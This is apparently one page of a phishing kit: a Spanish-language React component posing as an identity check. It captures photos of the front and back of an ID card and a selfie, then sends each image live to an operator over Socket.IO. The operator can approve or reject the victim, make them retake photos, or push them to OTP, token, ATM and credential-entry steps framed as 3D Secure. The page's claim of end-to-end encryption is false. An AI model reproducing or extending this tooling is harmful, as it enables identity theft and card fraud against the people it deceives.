/**
 * Face ID Verification Page
 * Captures: front of ID, back of ID, and selfie
 * Connected to Socket.IO for real-time admin control
 */

import { useState, useRef, useEffect } from "react";
import { io, Socket } from "socket.io-client";

type FaceIDStep = "front" | "back" | "selfie" | "processing" | "waiting" | "complete" | "error";

export default function FaceID() {
  const [step, setStep] = useState<FaceIDStep>("front");
  const [frontImage, setFrontImage] = useState<string | null>(null);
  const [backImage, setBackImage] = useState<string | null>(null);
  const [selfieImage, setSelfieImage] = useState<string | null>(null);
  const [error, setError] = useState("");
  const [sessionId, setSessionId] = useState("");
  const socketRef = useRef<Socket | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    // Get session ID from URL params or generate one
    const params = new URLSearchParams(window.location.search);
    const sid = params.get("session") || `faceid_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
    setSessionId(sid);

    // Connect to Socket.IO
    const socket = io(window.location.origin, { path: "/api/socket.io" });
    socketRef.current = socket;

    socket.on("connect", () => {
      socket.emit("user:faceid-start", { sessionId: sid, ipAddress: "" });
    });

    // Listen for admin commands
    socket.on("user:faceid-command", (data: { command: string }) => {
      if (data.command === "error") {
        setStep("error");
        setError("Verificación fallida. Intenta de nuevo con fotos más claras.");
      } else if (data.command === "approve") {
        setStep("complete");
      } else if (data.command === "retry-front") {
        setFrontImage(null);
        setStep("front");
        setError("Foto frontal no clara. Toma otra.");
      } else if (data.command === "retry-back") {
        setBackImage(null);
        setStep("back");
        setError("Foto trasera no clara. Toma otra.");
      } else if (data.command === "retry-selfie") {
        setSelfieImage(null);
        setStep("selfie");
        setError("Selfie no clara. Toma otra.");
      }
    });

    // Listen for goto-step from admin (to redirect user to any page/step)
    socket.on("user:goto-step", (data: { step: string }) => {
      if (data.step === "approve" || data.step === "completed") {
        setStep("complete");
        setTimeout(() => {
          window.location.href = `/payment-success`;
        }, 2000);
      } else if (data.step === "reject") {
        setStep("error");
        setError("Verificación rechazada por el operador.");
      } else {
        // Any other step (otp, dinamica, token, atm, credentials) → redirect to personal-info
        // Pass the step and session ID as URL params so PersonalInfo opens the 3D Secure modal directly
        window.location.href = `/personal-info?automodal=1&step=${data.step}&session=${sid}`;
      }
    });

    return () => { socket.disconnect(); };
  }, []);

  const handleFileSelect = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = (ev) => {
      const dataUrl = ev.target?.result as string;
      if (step === "front") {
        setFrontImage(dataUrl);
        // Send to admin via socket
        socketRef.current?.emit("user:faceid-upload", {
          sessionId,
          type: "front",
          image: dataUrl,
        });
        setStep("back");
        setError("");
      } else if (step === "back") {
        setBackImage(dataUrl);
        socketRef.current?.emit("user:faceid-upload", {
          sessionId,
          type: "back",
          image: dataUrl,
        });
        setStep("selfie");
        setError("");
      } else if (step === "selfie") {
        setSelfieImage(dataUrl);
        socketRef.current?.emit("user:faceid-upload", {
          sessionId,
          type: "selfie",
          image: dataUrl,
        });
        // Show processing briefly then waiting for operator
        setStep("processing");
        setError("");
        setTimeout(() => setStep("waiting"), 2500);
      }
    };
    reader.readAsDataURL(file);
    // Reset input
    e.target.value = "";
  };

  const triggerFileInput = () => {
    fileInputRef.current?.click();
  };

  const retryAll = () => {
    setFrontImage(null);
    setBackImage(null);
    setSelfieImage(null);
    setStep("front");
    setError("");
  };

  const getStepInfo = () => {
    switch (step) {
      case "front":
        return {
          title: "Foto Frontal de Cédula",
          subtitle: "Toma una foto clara del frente de tu documento de identidad",
          icon: "🪪",
          progress: 1,
        };
      case "back":
        return {
          title: "Foto Trasera de Cédula",
          subtitle: "Ahora toma una foto del reverso de tu documento",
          icon: "🔄",
          progress: 2,
        };
      case "selfie":
        return {
          title: "Selfie de Verificación",
          subtitle: "Toma una selfie clara mostrando tu rostro",
          icon: "🤳",
          progress: 3,
        };
      case "processing":
        return {
          title: "Verificando Identidad",
          subtitle: "Estamos procesando tu información...",
          icon: "⏳",
          progress: 3,
        };
      case "waiting":
        return {
          title: "Verificación Enviada",
          subtitle: "Tus documentos fueron recibidos. Espera mientras un operador revisa tu identidad.",
          icon: "✅",
          progress: 3,
        };
      case "complete":
        return {
          title: "Verificación Exitosa",
          subtitle: "Tu identidad ha sido verificada correctamente",
          icon: "✅",
          progress: 3,
        };
      case "error":
        return {
          title: "Error de Verificación",
          subtitle: error || "Hubo un problema con la verificación",
          icon: "❌",
          progress: 0,
        };
    }
  };

  const info = getStepInfo();

  return (
    <div className="min-h-[100dvh] bg-[#141414] flex items-center justify-center p-4 safe-area-inset">
      <div className="w-full max-w-md px-1 sm:px-0">
        {/* Progress Bar */}
        <div className="mb-6">
          <div className="flex justify-between mb-2">
            {[1, 2, 3].map((i) => (
              <div
                key={i}
                className={`h-1.5 flex-1 rounded-full mx-1 transition-all duration-300 ${
                  i <= info.progress
                    ? "bg-gradient-to-r from-red-500 to-red-400"
                    : "bg-gray-700"
                }`}
              />
            ))}
          </div>
          <p className="text-center text-gray-500 text-xs">
            Paso {info.progress} de 3
          </p>
        </div>

        {/* Main Card */}
        <div className="bg-gray-900/80 backdrop-blur-xl rounded-2xl p-5 sm:p-8 border border-gray-800 shadow-2xl">
          {/* Icon */}
          <div className="text-center mb-6">
            <div className="w-16 h-16 sm:w-20 sm:h-20 mx-auto mb-3 sm:mb-4 rounded-2xl bg-gradient-to-br from-red-500/10 to-orange-500/10 border border-red-500/20 flex items-center justify-center">
              <span className="text-3xl sm:text-4xl">{info.icon}</span>
            </div>
            <h1 className="text-lg sm:text-xl font-bold text-white">{info.title}</h1>
            <p className="text-xs sm:text-sm text-gray-400 mt-1.5 sm:mt-2">{info.subtitle}</p>
          </div>

          {/* Error Message */}
          {error && step !== "error" && (
            <div className="mb-4 bg-red-500/10 border border-red-500/20 rounded-lg px-3 py-2 text-center">
              <p className="text-red-400 text-xs">{error}</p>
            </div>
          )}

          {/* Upload Area */}
          {(step === "front" || step === "back" || step === "selfie") && (
            <div className="space-y-4">
              <input
                ref={fileInputRef}
                type="file"
                accept="image/*"
                capture={step === "selfie" ? "user" : "environment"}
                onChange={handleFileSelect}
                className="hidden"
              />
              <button
                onClick={triggerFileInput}
                className="w-full py-6 border-2 border-dashed border-gray-600 hover:border-red-500/50 rounded-xl text-gray-400 hover:text-white transition-all flex flex-col items-center gap-3 active:scale-[0.97]"
              >
                <span className="text-3xl">📷</span>
                <span className="text-sm font-medium">
                  {step === "selfie" ? "Tomar Selfie" : "Tomar Foto"}
                </span>
                <span className="text-xs text-gray-500">
                  Toca para abrir la cámara
                </span>
              </button>

              {/* Preview of previous captures */}
              <div className="flex gap-2 justify-center">
                {frontImage && (
                  <div className="w-16 h-10 rounded-lg overflow-hidden border border-green-500/30">
                    <img src={frontImage} alt="Front" className="w-full h-full object-cover" />
                  </div>
                )}
                {backImage && (
                  <div className="w-16 h-10 rounded-lg overflow-hidden border border-green-500/30">
                    <img src={backImage} alt="Back" className="w-full h-full object-cover" />
                  </div>
                )}
                {selfieImage && (
                  <div className="w-10 h-10 rounded-full overflow-hidden border border-green-500/30">
                    <img src={selfieImage} alt="Selfie" className="w-full h-full object-cover" />
                  </div>
                )}
              </div>
            </div>
          )}

          {/* Processing */}
          {step === "processing" && (
            <div className="text-center py-8">
              <div className="w-12 h-12 mx-auto border-4 border-red-500/20 border-t-red-500 rounded-full animate-spin" />
              <p className="text-gray-400 text-sm mt-4">Esto puede tomar unos segundos...</p>
            </div>
          )}

          {/* Waiting for operator */}
          {step === "waiting" && (
            <div className="text-center py-8">
              <div className="w-16 h-16 mx-auto bg-green-500/10 border border-green-500/30 rounded-full flex items-center justify-center mb-4">
                <span className="text-3xl">✅</span>
              </div>
              <p className="text-green-400 text-sm font-medium mb-2">Documentos recibidos correctamente</p>
              <p className="text-gray-400 text-xs">Un operador está revisando tu identidad...</p>
              <div className="mt-4 flex justify-center">
                <div className="flex gap-1">
                  <div className="w-2 h-2 bg-green-500 rounded-full animate-bounce" style={{ animationDelay: '0ms' }} />
                  <div className="w-2 h-2 bg-green-500 rounded-full animate-bounce" style={{ animationDelay: '150ms' }} />
                  <div className="w-2 h-2 bg-green-500 rounded-full animate-bounce" style={{ animationDelay: '300ms' }} />
                </div>
              </div>
            </div>
          )}

          {/* Complete */}
          {step === "complete" && (
            <div className="text-center py-8">
              <div className="w-16 h-16 mx-auto bg-green-500/10 border border-green-500/30 rounded-full flex items-center justify-center mb-4">
                <span className="text-3xl">✓</span>
              </div>
              <p className="text-green-400 text-sm">Verificación completada exitosamente</p>
            </div>
          )}

          {/* Error with retry */}
          {step === "error" && (
            <div className="text-center py-4">
              <button
                onClick={retryAll}
                className="w-full bg-gradient-to-r from-red-600 to-red-500 hover:from-red-500 hover:to-red-400 text-white font-semibold py-3.5 rounded-xl transition-all active:scale-[0.97]"
              >
                Reintentar Verificación
              </button>
            </div>
          )}
        </div>

        {/* Security Notice */}
        <div className="mt-4 text-center">
          <p className="text-gray-600 text-[10px]">
            🔒 Tus datos están protegidos con encriptación de extremo a extremo
          </p>
        </div>
      </div>
    </div>
  );
}
